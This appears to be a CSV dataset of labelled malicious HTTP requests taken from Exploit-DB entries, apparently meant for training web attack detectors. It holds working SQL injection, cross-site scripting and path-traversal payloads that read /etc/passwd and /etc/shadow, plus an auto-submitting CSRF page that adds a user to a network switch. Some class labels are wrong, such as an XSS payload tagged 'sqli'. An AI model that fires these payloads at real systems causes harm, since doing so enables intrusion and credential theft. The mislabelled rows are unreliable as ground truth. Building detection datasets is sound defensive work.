"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_luongvd_000687","1","exploitdb","https://www.exploit-db.com/exploits/37726","GET","http://server/demo/allgallery.php?id=-100%27+union+select+user","/demo/allgallery.php","id=-100%27+union+select+user","[]","","http://server/demo/allgallery.php?id=-100%27+union+select+user","sqli"
"pos_luongvd_000688","1","exploitdb","https://www.exploit-db.com/exploits/37547","GET","https://A.B.C.D/d4d/exporters.php?a<script>alert(123)</script>=1","/d4d/exporters.php","a<script>alert(123)</script>=1","[[""Host"", ""A.B.C.D""], [""User-Agent"", ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:12.0) Gecko/20100101 Firefox/12.0""], [""Accept"", ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8""], [""Accept-Language"", ""en-us,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""Proxy-Connection"", ""keep-alive""]]","#Response 1
<snip>
<a href=""/d4d/exporters.php?a<script>alert(1)</script>=1"">/d4d/exporters.php?a<script>alert(123)</script>=1</a></td></tr>
<snip>

#Request 2","GET /d4d/exporters.php?a<script>alert(123)</script>=1 HTTP/1.1
Host: A.B.C.D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:12.0) Gecko/20100101 Firefox/12.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive

#Response 1
<snip>
<a href=""/d4d/exporters.php?a<script>alert(1)</script>=1"">/d4d/exporters.php?a<script>alert(123)</script>=1</a></td></tr>
<snip>

#Request 2","xss"
"pos_luongvd_000689","1","exploitdb","https://www.exploit-db.com/exploits/37547","GET","https://A.B.C.D/d4d/exporters.php","/d4d/exporters.php","","[[""Host"", ""A.B.C.D""], [""Accept"", ""*/*""], [""Accept-Language"", ""en""], [""User-Agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)""], [""Connection"", ""close""], [""Referer"", ""http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1""], [""Content-Length"", ""2""]]","#Response 2
<snip>
<a href=""http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1"">http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1</a>
<snip>","GET /d4d/exporters.php HTTP/1.1
Host: A.B.C.D
Accept: */*
Accept-Language: en
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
Connection: close
Referer: http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1
Content-Length: 2

#Response 2
<snip>
<a href=""http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1"">http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1</a>
<snip>","xss"
"pos_luongvd_000690","1","exploitdb","https://www.exploit-db.com/exploits/37516","GET","https://192.168.31.10/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd","/cgi-bin/webproc","var:page=wizard&var:menu=setup&getpage=/etc/passwd","[[""Host"", ""192.168.31.10""]]","User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: sessionid=2b48aa9b

Connection: keep-alive



HTTP/1.0 200 OK

Content-type: text/html

Pragma: no-cache

Cache-Control: no-cache

set-cookie: sessionid=2b48aa9b; expires=Fri, 31-Dec-9999 23:59:59 GMT;path=/



#root:x:0:0:root:/root:/bin/bash
root:x:0:0:root:/root:/bin/sh
#tw:x:504:504::/home/tw:/bin/bash
#tw:x:504:504::/home/tw:/bin/msh","GET /cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd HTTP/1.1

Host: 192.168.31.10

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: sessionid=2b48aa9b

Connection: keep-alive



HTTP/1.0 200 OK

Content-type: text/html

Pragma: no-cache

Cache-Control: no-cache

set-cookie: sessionid=2b48aa9b; expires=Fri, 31-Dec-9999 23:59:59 GMT;path=/



#root:x:0:0:root:/root:/bin/bash
root:x:0:0:root:/root:/bin/sh
#tw:x:504:504::/home/tw:/bin/bash
#tw:x:504:504::/home/tw:/bin/msh","lfi"
"pos_luongvd_000691","1","exploitdb","https://www.exploit-db.com/exploits/37516","GET","https://192.168.31.10/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/shadow","/cgi-bin/webproc","var:page=wizard&var:menu=setup&getpage=/etc/shadow","[[""Host"", ""192.168.31.10""]]","User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: sessionid=2b48aa9b

Connection: keep-alive


HTTP/1.0 200 OK

Content-type: text/html

Pragma: no-cache

Cache-Control: no-cache

set-cookie: sessionid=2b48aa9b; expires=Fri, 31-Dec-9999 23:59:59 GMT;path=/



#root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::","GET /cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/shadow HTTP/1.1

Host: 192.168.31.10

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: sessionid=2b48aa9b

Connection: keep-alive


HTTP/1.0 200 OK

Content-type: text/html

Pragma: no-cache

Cache-Control: no-cache

set-cookie: sessionid=2b48aa9b; expires=Fri, 31-Dec-9999 23:59:59 GMT;path=/



#root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::","lfi"
"pos_luongvd_000692","1","exploitdb","https://www.exploit-db.com/exploits/37467","GET","/jsps/genrequest.jsp?&routineName=OS.NEW.USER& routineArgs=BANNER""/><STYLE>@import""javascript:alert ('XSS%20Dangerous')"";</STYLE>","/jsps/genrequest.jsp","&routineName=OS.NEW.USER& routineArgs=BANNER""/><STYLE>@import""javascript:alert ('XSS%20Dangerous')"";</STYLE>","[]","","GET /jsps/genrequest.jsp?&routineName=OS.NEW.USER& routineArgs=BANNER""/><STYLE>@import""javascript:alert ('XSS%20Dangerous')"";</STYLE> HTTP/1.1","xss"
"pos_luongvd_000693","1","exploitdb","https://www.exploit-db.com/exploits/37274","GET","http://server/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd","/wp-content/plugins/se-html5-album-audio-player/download_audio.php","file=/wp-content/uploads/../../../../../etc/passwd","[]","","http://server/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd","lfi"
"pos_luongvd_000694","1","exploitdb","https://www.exploit-db.com/exploits/37261","POST","https://192.0.2.1/sec/content/os6250_sec_asa_users_local_db_family_mod.html","/sec/content/os6250_sec_asa_users_local_db_family_mod.html","","[[""Host"", ""192.0.2.1""], [""Cookie"", ""session=sess_15739""], [""Content-Type"", ""application/x-www-form-urlencoded""], [""Content-Length"", ""167""]]","  EmWeb_ns:mip:2.T1:I1=attacker
  &EmWeb_ns:mip:4.T1:O1=
  &EmWeb_ns:mip:5.T1:O2=
  &EmWeb_ns:mip:6.T1:O3=4294967295
  &EmWeb_ns:mip:7.T1:O4=4294967295

This request sets all access privileges for the user ""attacker"" and
is again completely predictable.


Proof of Concept
================

Visiting the following HTML page will create a new user via the switch's
management web interface, if the user is authenticated at the switch:

------------------------------------------------------------------------
<html>
<head>
<title>Alcatel-Lucent OmniSwitch 6450 create user via CSRF</title>
</head>
<body>
  <form action=""http://192.0.2.1/sec/content/sec_asa_users_local_db_add.html""
  method=""POST"" id=""CSRF"" style=""visibility:hidden"">
    <input type=""hidden"" name=""EmWeb_ns:mip:2.T1:I1"" value=""attacker"" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O1"" value=""secret"" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O2"" value=""-1"" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O3"" value="""" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O4"" value=""1"" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O5"" value=""4"" />
  </form>
<script>
document.getElementById(""CSRF"").submit();
</script>
</body>
</html>
------------------------------------------------------------------------


Workaround
==========

Disable the web interface by executing the following commands:

AOS6:

  no ip service http
  no ip service secure-http

AOS 7/8:

  ip service http admin-state disable

If this is not possible, use a dedicated browser or browser profile for
managing the switch via the web interface.


Fix
===

Upgrade the firmware to a fixed version, according to the vendor the
fixed versions will be available at the end of July 2015.


Security Risk
=============

If attackers trick a logged-in administrator to visit an attacker-controlled
web page, the attacker can perform actions and reconfigure the switch. In this
situation an attacker can create an additional user account on the switch for
future access. While a successful attack results in full access to the switch,
the attack is hard to exploit because attackers need to know the IP address of
the switch and get an administrative user to access an attacker-controlled web
page. The vulnerability is therefore rated as a medium risk.


Timeline
========

2015-03-16 Vulnerability identified
2015-03-25 Customer approves disclosure to vendor
2015-03-26 CVE number requested
2015-03-31 CVE number assigned
2015-04-01 Vendor notified
2015-04-02 Vendor acknowledged receipt of advisories
2015-04-08 Requested status update from vendor, vendor is investigating
2015-04-29 Requested status update from vendor, vendor is still investigating
2015-05-22 Requested status update from vendor
2015-05-27 Vendor is working on the issue
2015-06-05 Vendor notified customers
2015-06-08 Vendor provided details about affected versions
2015-06-10 Advisory released


RedTeam Pentesting GmbH
=======================

RedTeam Pentesting offers individual penetration tests performed by a
team of specialised IT-security experts. Hereby, security weaknesses in
company networks or products are uncovered and can be fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
https://www.redteam-pentesting.de.


--
RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
Dennewartstr. 25-27                       Fax : +49 241 510081-99
52068 Aachen                    https://www.redteam-pentesting.de
Germany                         Registergericht: Aachen HRB 14004
Geschäftsführer:                       Patrick Hof, Jens Liebchen","POST /sec/content/os6250_sec_asa_users_local_db_family_mod.html HTTP/1.1
  Host: 192.0.2.1
  [...]
  Cookie: session=sess_15739
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 167

  EmWeb_ns:mip:2.T1:I1=attacker
  &EmWeb_ns:mip:4.T1:O1=
  &EmWeb_ns:mip:5.T1:O2=
  &EmWeb_ns:mip:6.T1:O3=4294967295
  &EmWeb_ns:mip:7.T1:O4=4294967295

This request sets all access privileges for the user ""attacker"" and
is again completely predictable.


Proof of Concept
================

Visiting the following HTML page will create a new user via the switch's
management web interface, if the user is authenticated at the switch:

------------------------------------------------------------------------
<html>
<head>
<title>Alcatel-Lucent OmniSwitch 6450 create user via CSRF</title>
</head>
<body>
  <form action=""http://192.0.2.1/sec/content/sec_asa_users_local_db_add.html""
  method=""POST"" id=""CSRF"" style=""visibility:hidden"">
    <input type=""hidden"" name=""EmWeb_ns:mip:2.T1:I1"" value=""attacker"" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O1"" value=""secret"" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O2"" value=""-1"" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O3"" value="""" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O4"" value=""1"" />
    <input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O5"" value=""4"" />
  </form>
<script>
document.getElementById(""CSRF"").submit();
</script>
</body>
</html>
------------------------------------------------------------------------


Workaround
==========

Disable the web interface by executing the following commands:

AOS6:

  no ip service http
  no ip service secure-http

AOS 7/8:

  ip service http admin-state disable

If this is not possible, use a dedicated browser or browser profile for
managing the switch via the web interface.


Fix
===

Upgrade the firmware to a fixed version, according to the vendor the
fixed versions will be available at the end of July 2015.


Security Risk
=============

If attackers trick a logged-in administrator to visit an attacker-controlled
web page, the attacker can perform actions and reconfigure the switch. In this
situation an attacker can create an additional user account on the switch for
future access. While a successful attack results in full access to the switch,
the attack is hard to exploit because attackers need to know the IP address of
the switch and get an administrative user to access an attacker-controlled web
page. The vulnerability is therefore rated as a medium risk.


Timeline
========

2015-03-16 Vulnerability identified
2015-03-25 Customer approves disclosure to vendor
2015-03-26 CVE number requested
2015-03-31 CVE number assigned
2015-04-01 Vendor notified
2015-04-02 Vendor acknowledged receipt of advisories
2015-04-08 Requested status update from vendor, vendor is investigating
2015-04-29 Requested status update from vendor, vendor is still investigating
2015-05-22 Requested status update from vendor
2015-05-27 Vendor is working on the issue
2015-06-05 Vendor notified customers
2015-06-08 Vendor provided details about affected versions
2015-06-10 Advisory released


RedTeam Pentesting GmbH
=======================

RedTeam Pentesting offers individual penetration tests performed by a
team of specialised IT-security experts. Hereby, security weaknesses in
company networks or products are uncovered and can be fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
https://www.redteam-pentesting.de.


--
RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
Dennewartstr. 25-27                       Fax : +49 241 510081-99
52068 Aachen                    https://www.redteam-pentesting.de
Germany                         Registergericht: Aachen HRB 14004
Geschäftsführer:                       Patrick Hof, Jens Liebchen","xss"
"pos_luongvd_000695","1","exploitdb","https://www.exploit-db.com/exploits/37271","POST","https://192.168.0.20/state/service/166/exec","/state/service/166/exec","","[[""Host"", ""192.168.0.20""], [""User-Agent"", ""Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0""], [""Accept"", ""text/plain, */*; q=0.01""], [""Accept-Language"", ""en-US,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""Content-Type"", ""application/x-www-form-urlencoded; charset=UTF-8""], [""X-Requested-With"", ""XMLHttpRequest""], [""Referer"", ""http://192.168.0.20/status/service?host_state=0&host_filter=handled&host=opsview""], [""Content-Length"", ""105""], [""Cookie"", ""PHPSESSID=""], [""Connection"", ""keep-alive""], [""Pragma"", ""no-cache""], [""Cache-Control"", ""no-cache""]]","plugin_args=%3Cscript%3Ealert(%22opsview%22)%3C%2Fscript%3E&_CSRFToken=0x84BCDAD00D5111E5988CB34E7AFD915","POST /state/service/166/exec HTTP/1.1
Host: 192.168.0.20
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0
Accept: text/plain, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.20/status/service?host_state=0&host_filter=handled&host=opsview
Content-Length: 105
Cookie: PHPSESSID=
auth_tkt=
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

plugin_args=%3Cscript%3Ealert(%22opsview%22)%3C%2Fscript%3E&_CSRFToken=0x84BCDAD00D5111E5988CB34E7AFD915","sqli"
"pos_luongvd_000696","1","exploitdb","https://www.exploit-db.com/exploits/37207","GET","[SOME_CMS]/phpthumb/demo/phpThumb.demo.random.php?dir=""><script>alert(document.cookie);</script>","[SOME_CMS]/phpthumb/demo/phpThumb.demo.random.php","dir=""><script>alert(document.cookie);</script>","[]","","GET [SOME_CMS]/phpthumb/demo/phpThumb.demo.random.php?dir=""><script>alert(document.cookie);</script> HTTP/1.1","xss"
"pos_luongvd_000697","1","exploitdb","https://www.exploit-db.com/exploits/37206","GET","[SOME_CMS]/phpthumb/demo/phpThumb.demo.showpic.php?title=""><script>alert(document.cookie);</script>","[SOME_CMS]/phpthumb/demo/phpThumb.demo.showpic.php","title=""><script>alert(document.cookie);</script>","[]","","GET [SOME_CMS]/phpthumb/demo/phpThumb.demo.showpic.php?title=""><script>alert(document.cookie);</script> HTTP/1.1","xss"
"pos_luongvd_000698","1","exploitdb","https://www.exploit-db.com/exploits/37172","POST","https://10.0.0.1/tips/tipsLoginSubmit.action","/tips/tipsLoginSubmit.action","","[[""Host"", ""10.0.0.1""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0)""], [""Accept"", ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8""], [""Accept-Language"", ""it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3""], [""Accept-Encoding"", ""gzip, deflate""], [""Referer"", ""https://10.0.0.1/tips/tipsLoginSubmit.action""], [""Cookie"", ""<A VALID UNAUTH COOKIE>""], [""Connection"", ""close""], [""Content-Type"", ""application/x-www-form-urlencoded""], [""Content-Length"", ""58""]]","username=""><img src=x onerror=alert(""0wn3d"")><""&password=test
-------------------------------------------------------------------------------

A copy of the report with technical details about the vulnerability I have
identified is available at:
https://github.com/cmaruti/reports/blob/master/aruba_clearpass.pdf


[VULNERABILITY REFERENCE]

The following CVE ID was allocated to track the vulnerability:
- CVE-2015-1389: Stored cross-site scripting (XSS)

[DISCLOSURE TIMELINE]

2014-11-24 Vulnerability submitted to vendor through the Bugcrowd
bounty program.
2014-12-09 Vendor acknowledged the problem.
2014-12-10 Researcher requested to publicly disclose the issue.
2015-02-16 Vendor released a fix for the reported issue.
2015-02-09 Vendor asked to hold-on for the public disclosure.
2015-02-22 Vendor postponed the public disclosure date
2015-02-22 Public coordinated disclosure.



[SOLUTION]

Aruba release an update to fix the vulnerability (ClearPass 6.5 or
later). Please see
the below link for further information released by the vendor:
- http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2015-006.txt


[REPORT URL]

https://github.com/cmaruti/reports/blob/master/aruba_clearpass.pdf","POST /tips/tipsLoginSubmit.action HTTP/1.1
Host: 10.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://10.0.0.1/tips/tipsLoginSubmit.action
Cookie: <A VALID UNAUTH COOKIE>
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

username=""><img src=x onerror=alert(""0wn3d"")><""&password=test
-------------------------------------------------------------------------------

A copy of the report with technical details about the vulnerability I have
identified is available at:
https://github.com/cmaruti/reports/blob/master/aruba_clearpass.pdf


[VULNERABILITY REFERENCE]

The following CVE ID was allocated to track the vulnerability:
- CVE-2015-1389: Stored cross-site scripting (XSS)

[DISCLOSURE TIMELINE]

2014-11-24 Vulnerability submitted to vendor through the Bugcrowd
bounty program.
2014-12-09 Vendor acknowledged the problem.
2014-12-10 Researcher requested to publicly disclose the issue.
2015-02-16 Vendor released a fix for the reported issue.
2015-02-09 Vendor asked to hold-on for the public disclosure.
2015-02-22 Vendor postponed the public disclosure date
2015-02-22 Public coordinated disclosure.



[SOLUTION]

Aruba release an update to fix the vulnerability (ClearPass 6.5 or
later). Please see
the below link for further information released by the vendor:
- http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2015-006.txt


[REPORT URL]

https://github.com/cmaruti/reports/blob/master/aruba_clearpass.pdf","xss"
"pos_luongvd_000699","1","exploitdb","https://www.exploit-db.com/exploits/37078","GET","http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3Cscript%3E","/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php","title=%3Cscript%3E","[]","","http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3Cscript%3E","xss"
"pos_luongvd_000700","1","exploitdb","https://www.exploit-db.com/exploits/37077","GET","http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/save_successful.php?msg=%3Cscript%3E","/wp-content/plugins/all-in-one-event-calendar/app/view/save_successful.php","msg=%3Cscript%3E","[]","","http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/save_successful.php?msg=%3Cscript%3E","xss"
"pos_luongvd_000701","1","exploitdb","https://www.exploit-db.com/exploits/37019","POST","https://192.168.7.5/mybb/admin/index.php?module=user-users&action=search","/mybb/admin/index.php","module=user-users&action=search","[[""Host"", ""192.168.7.5""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 6.1; rv:10.0) Gecko/20100101 Firefox/10.0""], [""Accept"", ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8""], [""Accept-Language"", ""en-us,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""Proxy-Connection"", ""keep-alive""], [""Referer"", ""http://192.168.7.5/mybb/admin/index.php?module=user-users&action=search""], [""Cookie"", ""mybb[lastvisit]=1332694756; mybb[lastactive]=1332699650; mybb[referrer]=1; loginattempts=1;""], [""Content-Type"", ""application/x-www-form-urlencoded""], [""Content-Length"", ""638""]]","my_post_key=5dbe489b5b03d9d9e2d387ff9267567d&conditions%5Busername%5D=aditya&conditions%5Bemail%5D=aditya
&conditions%5Busergroup%5D%5B%5D=2<script>document.write(Date())</script>&conditions%5Bwebsite%5D=&conditions%5Bicq%5D=
&conditions%5Baim%5D=&conditions%5Byahoo%5D=&conditions%5Bmsn%5D=&conditions%5Bsignature%5D=&conditions%5Busertitle%5D=
&conditions%5Bpostnum_dir%5D=greater_than&conditions%5Bpostnum%5D=&conditions%5Bregdate%5D=
&conditions%5Bregip%5D=&conditions%5Blastip%5D=&conditions%5Bpostip%5D=&profile_fields%5Bfid3%5D%5Bfid3%5D=N%2FA
&profile_fields%5Bfid1%5D=&profile_fields%5Bfid2%5D=&sortby=username&order=asc&perpage=&displayas=card","POST /mybb/admin/index.php?module=user-users&action=search HTTP/1.1
Host: 192.168.7.5
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:10.0) Gecko/20100101 Firefox/10.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://192.168.7.5/mybb/admin/index.php?module=user-users&action=search
Cookie: mybb[lastvisit]=1332694756; mybb[lastactive]=1332699650; mybb[referrer]=1; loginattempts=1;
adminsid=a82d27dd72efdb0a99c009db7701e847; acploginattempts=0; mybbuser=1_CAo7pz2wUvHGtlJht9OLGyXG8ZVbS78xAXx6ZTzBrvNSe5S2GM;
sid=d725ac10b7d8f0f8765dfa73f5dcf23b
Content-Type: application/x-www-form-urlencoded
Content-Length: 638

my_post_key=5dbe489b5b03d9d9e2d387ff9267567d&conditions%5Busername%5D=aditya&conditions%5Bemail%5D=aditya
&conditions%5Busergroup%5D%5B%5D=2<script>document.write(Date())</script>&conditions%5Bwebsite%5D=&conditions%5Bicq%5D=
&conditions%5Baim%5D=&conditions%5Byahoo%5D=&conditions%5Bmsn%5D=&conditions%5Bsignature%5D=&conditions%5Busertitle%5D=
&conditions%5Bpostnum_dir%5D=greater_than&conditions%5Bpostnum%5D=&conditions%5Bregdate%5D=
&conditions%5Bregip%5D=&conditions%5Blastip%5D=&conditions%5Bpostip%5D=&profile_fields%5Bfid3%5D%5Bfid3%5D=N%2FA
&profile_fields%5Bfid1%5D=&profile_fields%5Bfid2%5D=&sortby=username&order=asc&perpage=&displayas=card","xss"
